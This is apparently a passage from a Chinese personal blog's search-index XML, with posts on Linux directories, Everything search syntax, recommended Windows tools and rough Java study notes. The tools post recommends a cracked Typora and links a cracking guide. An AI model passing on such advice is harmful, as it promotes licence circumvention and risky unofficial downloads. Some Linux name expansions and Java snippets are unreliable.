<code>/srv</code></strong></h3><ul><li><strong>全称</strong>：Service Directory</li><li><strong>含义</strong>：<code>srv</code> 是 “service” 的缩写，表示服务。</li><li><strong>作用</strong>：存放服务数据，如网站数据、FTP 数据等。</li></ul><hr><h3 id="理解目录名称的意义"><a href="#理解目录名称的意义" class="headerlink" title="理解目录名称的意义"></a><strong>理解目录名称的意义</strong></h3><p>这些目录名称通常是它们功能的缩写或简写，理解这些名称的全称和含义可以帮助你更好地记忆和理解它们的作用。例如：</p><ul><li><code>/etc</code>（配置文件目录）：<code>etc</code> 是 “extended system configuration” 的缩写，表示存放系统配置文件。</li><li><code>/var</code>（可变数据目录）：<code>var</code> 是 “variable” 的缩写，表示存放可变数据。</li><li><code>/usr</code>（用户资源目录）：<code>usr</code> 是 “Unix system resources” 的缩写，表示存放用户程序和资源。</li></ul><p>通过这些名称的全称和含义，你可以更直观地理解每个目录的作用，从而更好地管理和使用 Linux 系统。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Everything</title>
      <link href="/2025/01/20/Everything/"/>
      <url>/2025/01/20/Everything/</url>
      
        <content type="html"><![CDATA[<h2 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法"></a>搜索语法</h2><blockquote><p><code>space</code> 表示 and , <code>|</code> 表示或, <code>!</code> 表示否</p><p><code>*</code> 表示匹配多个字符 <code>?</code> 匹配一个字符</p><p>dirname\ 搜索条件</p><p><code>?</code> 只能在拓展名里使用</p><p><code>size:</code> <code>file:</code> <code>dm</code> 进行大小文件类型更改时间筛选</p></blockquote><ol><li>如果要搜索多个关键字用空格隔开</li><li>当搜索的文件名里有空格时用双引号 <code>“”</code></li><li>指定文件目录 搜索示例（目录加反斜杠，加空格）system32\ *.txt</li><li><code>|</code> 之间要加空格 <em>.jpg | </em>.png</li></ol>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/01/19/UploadTest/"/>
      <url>/2025/01/19/UploadTest/</url>
      
        <content type="html"><![CDATA[<h1 id="本文用于测试图片显示"><a href="#本文用于测试图片显示" class="headerlink" title="本文用于测试图片显示"></a>本文用于测试图片显示</h1><p><img src="https://cdn.jsdelivr.net/gh/SunRisexyz/image@main/img/20250119172832690.png" alt="image-20250119171718346"></p><p><img src="https://cdn.jsdelivr.net/gh/SunRisexyz/image@main/img/20250120115751519.png" alt="image-20250120113203295"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>个人推荐的Windows工具</title>
      <link href="/2025/01/19/%E4%B8%AA%E4%BA%BA%E6%8E%A8%E8%8D%90%E7%9A%84Windows%E5%B7%A5%E5%85%B7/"/>
      <url>/2025/01/19/%E4%B8%AA%E4%BA%BA%E6%8E%A8%E8%8D%90%E7%9A%84Windows%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="火绒-杀毒软件-新机必装"><a href="#火绒-杀毒软件-新机必装" class="headerlink" title="火绒(杀毒软件)(新机必装)"></a>火绒(杀毒软件)(新机必装)</h2><p>相对于 360, 腾讯电脑管家, 金山毒霸等老牌杀毒软件, 火绒的杀毒能力逊色一筹, 但是他的广告拦截能力很强, 下载后基本没有广告</p><h3 id="下载方式"><a href="#下载方式" class="headerlink" title="下载方式:"></a>下载方式:</h3><p><a href="https://www.huorong.cn/">https://www.huorong.cn/</a></p><h2 id="Typora-笔记软件"><a href="#Typora-笔记软件" class="headerlink" title="Typora(笔记软件)"></a>Typora(笔记软件)</h2><h3 id="软件展示："><a href="#软件展示：" class="headerlink" title="软件展示："></a>软件展示：</h3><p><img src="../image/个人推荐的Windows工具/screenshots.gif" alt="屏幕录屏"  /></p><h3 id="下载方式-1"><a href="#下载方式-1" class="headerlink" title="下载方式:"></a>下载方式:</h3><p><a href="[https://typoraio.cn/](Typora官方下载">Typora 官方下载</a>)</p><h3 id="个人推荐"><a href="#个人推荐" class="headerlink" title="个人推荐:"></a>个人推荐:</h3><p>正版 Typora 是收费的, 这里我推荐使用破解版</p><p>具体操作可以参考以下文章 <a href="https://blog.csdn.net/qq_61621323/article/details/141036982">Typora 破解方法</a></p><p>(此篇博文就是在 typora 里写的)</p><h2 id="Fences-桌面整理软件"><a href="#Fences-桌面整理软件" class="headerlink" title="Fences(桌面整理软件)"></a>Fences(桌面整理软件)</h2><p>工具效果图如下</p><p><img src="https://cdn.jsdelivr.net/gh/SunRisexyz/image@main/img/20250119165528823.png" alt="image-20250119131407087"/></p><p>网上可以下载到免费版</p><h3 id="下载方式-2"><a href="#下载方式-2" class="headerlink" title="下载方式:"></a>下载方式:</h3><p><a href="https://soft.3dmgame.com/zt/fences/">Fences 免费版下载</a> 一般 Windows11 下载 64 位版本即可(具体下载版本根据个人电脑版本决定)</p><h2 id="uTools-综合性办公软件-yyds"><a href="#uTools-综合性办公软件-yyds" class="headerlink" title="uTools(综合性办公软件)(yyds)"></a>uTools(综合性办公软件)(yyds)</h2><h3 id="软件界面"><a href="#软件界面" class="headerlink" title="软件界面"></a>软件界面</h3><p><img src="../image/个人推荐的Windows工具/image-20250119132002564.png" alt="小工具" /></p><h3 id="软件用途"><a href="#软件用途" class="headerlink" title="软件用途"></a>软件用途</h3><p>可用于快速查找应用或者是使用快速截图等小工具</p><p>个人常用工具如下<br><img src="../image/个人推荐的Windows工具/image-20250119132357736.png" alt="小工具" /></p><h3 id="下载方式-3"><a href="#下载方式-3" class="headerlink" title="下载方式"></a>下载方式</h3><p><a href="https://u.tools/">官方下载</a> 普通版完全免费(yyds)</p><h2 id="EV-录屏-录屏软件"><a href="#EV-录屏-录屏软件" class="headerlink" title="EV 录屏(录屏软件)"></a>EV 录屏(录屏软件)</h2><h3 id="下载方式-4"><a href="#下载方式-4" class="headerlink" title="下载方式:"></a>下载方式:</h3><p><a href="https://www.ieway.cn/evcapture.html">官方下载</a></p><h2 id="Everything-EverythingToolBar-全盘文件搜索工具"><a href="#Everything-EverythingToolBar-全盘文件搜索工具" class="headerlink" title="Everything + EverythingToolBar(全盘文件搜索工具)"></a>Everything + EverythingToolBar(全盘文件搜索工具)</h2><h3 id="下载方式-5"><a href="#下载方式-5" class="headerlink" title="下载方式:"></a>下载方式:</h3><p><a href="https://www.voidtools.com/zh-cn/support/everything/">Everything 官方下载</a></p><p><a href="https://github.com/srwi/EverythingToolbar">EverythingToolBar 插件下载</a> （需要使用梯子访问外网）</p><p>读者可以自行搜索该工具插件进行下载</p><p>使用该插件时 everything 必须运行, 个人推荐将 everything 设为开机自启然后使用插件</p><h3 id="软件用法："><a href="#软件用法：" class="headerlink" title="软件用法："></a>软件用法：</h3><p><img src="../image/个人推荐的Windows工具/250119 152437.gif" alt="文件查找" /></p><h2 id="完美解码-全能的播放器"><a href="#完美解码-全能的播放器" class="headerlink" title="完美解码(全能的播放器)"></a>完美解码(全能的播放器)</h2><p>支持市场上几乎所有的视频音频格式, mp3.mp4.wav 等</p><h3 id="下载方式-6"><a href="#下载方式-6" class="headerlink" title="下载方式:"></a>下载方式:</h3><p><a href="https://jm.wmzhe.com/">官方下载</a></p><h2 id="QuickLook-无需打开快速预览文件"><a href="#QuickLook-无需打开快速预览文件" class="headerlink" title="QuickLook(无需打开快速预览文件)"></a>QuickLook(无需打开快速预览文件)</h2><h3 id="软件介绍："><a href="#软件介绍：" class="headerlink" title="软件介绍："></a>软件介绍：</h3><p>==适用于 Windows 的快速预览文件==</p><h3 id="使用操作-选中文件点击空格进行预览"><a href="#使用操作-选中文件点击空格进行预览" class="headerlink" title="使用操作: 选中文件点击空格进行预览"></a>使用操作: 选中文件点击空格进行预览</h3><p><img src="../image/个人推荐的Windows工具/250119 151214.gif" alt="快速预览" /></p><h3 id="下载方式-7"><a href="#下载方式-7" class="headerlink" title="下载方式:"></a>下载方式:</h3><p><a href="https://apps.microsoft.com/detail/9nv4bs3l1h4s?launch">https://apps.microsoft.com/detail/9nv4bs3l1h4s?launch</a> = true&amp;mode = full&amp;hl = zh-cn&amp;gl = cn&amp;ocid = bingwebsearch</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> Tools </tag>
            
            <tag> 效率 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java随笔</title>
      <link href="/2024/05/15/Java/"/>
      <url>/2024/05/15/Java/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-基础"><a href="#Java-基础" class="headerlink" title="Java 基础"></a>Java 基础</h1><h2 id="易错知识点"><a href="#易错知识点" class="headerlink" title="易错知识点"></a>易错知识点</h2><ol><li>等号=用于比较两个变量的引用（即内存地址）是否相同，而equals用于比较两个变量的内容（即内存地址里存放的值）是否相等</li><li>构造类中方法时要进行空参构造和全参构造</li><li>private只能在本类的方法中使用而protected可以再本类和子类的方法中使用</li><li>Object是所有类的父类,是顶级父类所有类都继承它</li><li>创建对象调用方法时不能为null,否则会报错(空指针异常)</li><li>基本数据类型byte(1字节)short(2字节)int(4字节)long(8字节)</li><li>12315613616L(L表示long类型)</li><li>int是基本数据类型,integer是引用数据类型,integer是一个int的对象可以进行toString()操作</li></ol><h2 id="java-入门"><a href="#java-入门" class="headerlink" title="java 入门"></a>java 入门</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//nextInt() nextDouble() </span></span><br><span class="line">        <span class="comment">//next()接受字符串，遇到空格制表符回车才停止接受数据 </span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//nextLine()接受字符串 可以接受空格制表符，回车结束</span></span><br><span class="line">        <span class="comment">//以上两种录入方法是不能混用的</span></span><br><span class="line">        <span class="keyword">import</span> java.util.Scanner;</span><br><span class="line">       <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in)</span><br><span class="line">        System.out.println(<span class="string">&quot;你认识小红&quot;</span>);<span class="comment">//换行输出 line next</span></span><br><span class="line"> System.out.print()</span><br><span class="line">        System.out.print()<span class="comment">//一行输出</span></span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用类时用 Car[] c=new Car();</span></span><br><span class="line">    System.out.println(<span class="string">&quot;你没认识小红&quot;</span>+gf.getName()+<span class="string">&quot;aksjflka&quot;</span>);</span><br><span class="line">    <span class="comment">//字符串对比用str1.equals(str2)</span></span><br><span class="line">    <span class="comment">//String类型内容不可改变&quot;abc&quot;--&gt;&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;&#125;--&gt;&quot;Qbc&quot;</span></span><br><span class="line">    <span class="type">byte</span>[] bytes=&#123;<span class="number">97</span>,<span class="number">98</span>,<span class="number">99</span>,<span class="number">100</span>&#125;;<span class="comment">//byte--&gt;(ascii)</span></span><br><span class="line">    <span class="comment">//byte类型一般在网络传输中使用，传输字节信息---&gt;io流</span></span><br><span class="line">    String s=<span class="keyword">new</span> <span class="title class_">String</span>(btyes);</span><br><span class="line">    System.out.println(s);---&gt;abcd</span><br><span class="line">&#125;</span><br><span class="line">非静态从属于对象，需要区分对象，静态方法从属于类，不需要区分对象</span><br><span class="line">因为<span class="built_in">this</span>它的作用就是指向调用者的地址值啊，<span class="keyword">static</span>全是共享的，就不必要用<span class="built_in">this</span>了</span><br><span class="line">    静态方法不能调用非静态成员变量(对象)</span><br><span class="line">    a(父类) <span class="keyword">instanceof</span> <span class="title function_">Dog</span><span class="params">(子类)</span> d(a是不是Dog类型的,如果是强转成Dog类型并命名为d,不是则<span class="literal">false</span>)</span><br><span class="line">    </span><br><span class="line">    data.fori ===&gt; <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;data;i++)&#123;&#125;</span><br></pre></td></tr></table></figure><p>==static修饰的方法或变量是在创建新类之前就创建了不能用实例调用static，直接用类名调用，只要是静态的东西，都可以类名点直接获取==</p><p>==创建静态内部对象的格式: 外部类名.内部类名 对象名 =new 外部类名.内部类名()==</p><p>编译能否成功看左边 编译结果要看右边</p><p>==调用静态方法的格式: 外部类名.内部类名.方法名()==</p><p>final相当于cpp的const final修饰方法表明此方法不能重写 修饰类不能被继承 修饰变量则只能赋值一次</p><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><h3 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h3><ol><li><p>方法形参中最多只能写一个可变参数</p></li><li><p>如果方法中除了可变参数以外还有其他形参,可变参数要写在最后</p></li><li><p>可变参数本质上是一个数组</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span>...args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j : args) &#123;</span><br><span class="line">            sum += j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="内部类和外部类"><a href="#内部类和外部类" class="headerlink" title="内部类和外部类"></a>内部类和外部类</h3><p>Java 内部类（嵌套类）与外部类之间的关系和特性如下：<br>定义：<br>外部类：正常的类，可以独立存在，不包含在其他类的定义内。<br>内部类（嵌套类）：定义在另一个类（外部类）内部的类，==它可以访问外部类的所有成员，包括私有成员==。<br>类型：<br>成员内部类：类似于外部类的成员，可以在类的方法之外定义，可以是 public, protected, private 或默认访问修饰符。<br>局部内部类：定义在方法、构造器或块内的类，作用域仅限于该方法或构造器。<br>匿名内部类：没有名称的内部类，通常用于简洁地实现接口或抽象类的一个实例。<br>静态内部类（嵌套类）：用 static 关键字声明，不直接与外部类的实例关联，可以像普通类一样创建对象。<br>访问权限：<br>内部类可以直接访问外部类的所有成员，包括私有成员和静态成员。<br>外部类要访问内部类的成员，必须先创建内部类的实例。<br>生命周期：<br>内部类的生命周期与外部类相关联，不能在没有外部类实例的情况下创建内部类的实例（静态内部类除外）。<br>对于非静态内部类，每个内部类对象都隐含地持有一个外部类的引用，可能导致外部类对象无法被垃圾回收。<br>使用场景：<br>内部类常用于封装特定于外部类的逻辑，提供更好的封装性和信息隐藏。<br>静态内部类常用于创建与外部类紧密相关的辅助类，但不需要外部类的实例。<br>编译结果：<br>编译后的 .class 文件，内部类会被编译成单独的文件，名称为外部类名加 $ 内部类名，例如 Outer$Inner.class。<br>内存模型：<br>内部类对象存在于外部类对象的堆内存中，而局部内部类对象存在于方法栈帧中。<br>这些特性使得内部类成为 Java 中一种强大的工具，尤其是在设计模式和复杂逻辑处理中。</p><h3 id="JavaBean-右键pte"><a href="#JavaBean-右键pte" class="headerlink" title="JavaBean(右键pte)"></a>JavaBean(右键pte)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GirlFriend</span>&#123;</span><br><span class="line">            <span class="keyword">private</span> String name;</span><br><span class="line">            <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">            <span class="keyword">private</span> String sex;</span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">GirlFriend</span><span class="params">(String name,<span class="type">int</span> age,String sex)</span>&#123;</span><br><span class="line">                <span class="built_in">this</span>.name = name;</span><br><span class="line">                <span class="built_in">this</span>.age = age;</span><br><span class="line">                <span class="built_in">this</span>.sex = sex;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">                <span class="built_in">this</span>.name = name;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> name;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">                <span class="built_in">this</span>.age = age;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> age;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(String sex)</span>&#123;</span><br><span class="line">                <span class="built_in">this</span>.sex = sex;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getSex</span><span class="params">()</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> sex;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h3><p>指在一个类中有多个同名方法(参数列表不同)<br>@override方法重写(只有添加到虚方法表的方法才能被重写,重写时子类权限必须大于父类)  this就近原则子类没有找父类</p><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>将对象的数据(属性)与数据的操作(方法)绑定在一起</p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>子类继承父类的公有方法和变量<br>继承:虚方法表(非final static private) super 调用父类</p><h3 id="接口-继承的一种"><a href="#接口-继承的一种" class="headerlink" title="接口(继承的一种)"></a>接口(继承的一种)</h3><p>接口是方法的抽象interface implements(实现)其中方法必须是抽象方法(必须重写)</p><p>protected 的方法在子类也可以使用</p><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>允许一个接口被多种数据类型实现或一个类可以有多种形态 ,能利用父类的引用或指针来指向子类的对象,从而实现不同对象对同一消息做出不同相应</p><h3 id="强转"><a href="#强转" class="headerlink" title="强转"></a>强转</h3><p>强制转换能使父类转换为真正的子类,从而使用子类私有功能</p><h3 id="泛型-只能是引用数据类型"><a href="#泛型-只能是引用数据类型" class="headerlink" title="泛型(只能是引用数据类型)"></a>泛型(只能是引用数据类型)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Box</span>&lt;T&gt; &#123;<span class="comment">//泛型类写法</span></span><br><span class="line">     <span class="keyword">private</span> T item;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(T item)</span> &#123; <span class="built_in">this</span>.item = item; &#125;</span><br><span class="line">     <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">()</span> &#123; <span class="keyword">return</span> item; &#125;</span><br><span class="line"> &#125;<span class="comment">//其中T为泛型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListUtil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ListUtil</span><span class="params">()</span>&#123;&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E&gt; <span class="keyword">void</span> <span class="title function_">addAll</span><span class="params">(ArrayList&lt;E&gt; list, E[] e)</span><span class="comment">//泛型方法</span></span><br><span class="line">    &#123;</span><br><span class="line">        Collections.addAll(list, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E&gt; <span class="keyword">void</span> <span class="title function_">addAll</span><span class="params">(ArrayList&lt;E&gt; list, E...e)</span><span class="comment">//可变参数里面可以传入多个参数==&gt;三个点</span></span><br><span class="line">    &#123;</span><br><span class="line">        Collections.addAll(list, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//泛型不具备继承性,但数据具备继承性</span></span><br></pre></td></tr></table></figure><p><img src="C:/Users/96004/AppData/Roaming/Typora/typora-user-images/image-20240515142518404.png" alt="image-20240515142518404"></p><h3 id="Java命名规范"><a href="#Java命名规范" class="headerlink" title="Java命名规范"></a>Java命名规范</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">包（Package）:</span><br><span class="line">包名全部小写，通常采用反向域名的形式，例如：com.example.myproject</span><br><span class="line"></span><br><span class="line">类（Class） 和 接口（Interface）:</span><br><span class="line">首字母大写的驼峰式命名，例如：MyClassName 或 MyInterfaceName</span><br><span class="line"></span><br><span class="line">枚举（Enum）:</span><br><span class="line">同类和接口的命名规则，例如：ColorType</span><br><span class="line"></span><br><span class="line">方法（Method）:</span><br><span class="line">小写字母开头的驼峰式命名，动词开头，例如：methodName 或 doSomething</span><br><span class="line"></span><br><span class="line">变量（Field）:</span><br><span class="line">小写字母开头的驼峰式命名，如果是实例变量，首字母小写，例如：instanceVariable</span><br><span class="line">如果是常量（<span class="keyword">final</span> <span class="keyword">static</span>），则全大写，单词间用下划线分隔，例如：<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> MAX_VALUE</span><br><span class="line"></span><br><span class="line">常量（Constant）:</span><br><span class="line">全部大写字母，单词间用下划线分隔，例如：MY_CONSTANT</span><br><span class="line"></span><br><span class="line">参数（Parameter）:</span><br><span class="line">同变量命名规则，小写字母开头的驼峰式命名，例如：parameterName</span><br><span class="line"></span><br><span class="line">局部变量（Local Variable）:</span><br><span class="line">同变量命名规则，但可以更简洁，只要保持可读性即可</span><br><span class="line"></span><br><span class="line">布尔变量（Boolean Variables）:</span><br><span class="line">避免使用简单的is或has作为布尔变量名，例如：isActive而不是isactive</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="java调试与反编译"><a href="#java调试与反编译" class="headerlink" title="java调试与反编译"></a>java调试与反编译</h3><p>内存查询工具可以使用   终端jps==&gt;jhsdb hsdb</p><p>终端 javap进行反编译</p><ul><li>java文件 + $ + 1.class</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Animal</span>()&#123;<span class="comment">//匿名类,继承animal方法</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;吃东西&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Animal</span>()&#123;<span class="comment">//匿名类,继承animal方法</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;匿名类调用吃东西&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.eat();<span class="comment">//新建类并调用重写的方法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Android的开发就有这个应用场景，当我要按一个按钮时会有一个设置监听器的方法来控制交互，里面需要转递一个对象，这里就可以用匿名累，不用额外再创建一个类了，大大简化了开发过程以及提升了开发效率</span><br><span class="line">    </span><br><span class="line">    method(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Animal</span>()&#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;狗吃东西&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );<span class="comment">//这样单次调用就不用新建一个新类，大大简化了开发过程以及提升了开发效率</span></span><br></pre></td></tr></table></figure><h2 id="常用API-现成的java类"><a href="#常用API-现成的java类" class="headerlink" title="常用API(现成的java类)"></a>常用API(现成的java类)</h2><h3 id="Math-Math-方法"><a href="#Math-Math-方法" class="headerlink" title="Math(Math.方法)"></a>Math(Math.方法)</h3><ol><li>abs(int)</li><li>ceil(double)向上取整 floor(double)向下取整</li><li>round(float)四舍五入</li><li>random()  [0.0,1.0)</li></ol><p><code>abs(int) ceil(double) floor(double) round(float)</code></p><h3 id="System"><a href="#System" class="headerlink" title="System"></a>System</h3><ol><li><p>exit(int status)当status==0时正常停止,非零异常停止</p></li><li><p>arraycopy(ArrayList a,index,arr,index,count)</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//把arr1数组中的数据拷贝到arr2中</span><br><span class="line">//参数一：数据源，要拷贝的数据从哪个数组而来</span><br><span class="line">/参数二：从数据源数组中的第几个索引开始拷贝</span><br><span class="line">//参数三：目的地，我要把数据拷贝到哪个数组中</span><br><span class="line">//参数四：目的地数组的索引。</span><br><span class="line">//参数五：拷贝的个数</span><br><span class="line">//System.arraycopy(arr1,0,arr2,0,5);</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>currentTimeMillis()时间戳 可用于加密和计算程序运行时间</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="type">long</span> <span class="variable">lastTime</span> <span class="operator">=</span> end - start;</span><br><span class="line">        System.out.println(lastTime);<span class="comment">//用来计算程序运行时间</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static Runtime getRuntime()</span><br><span 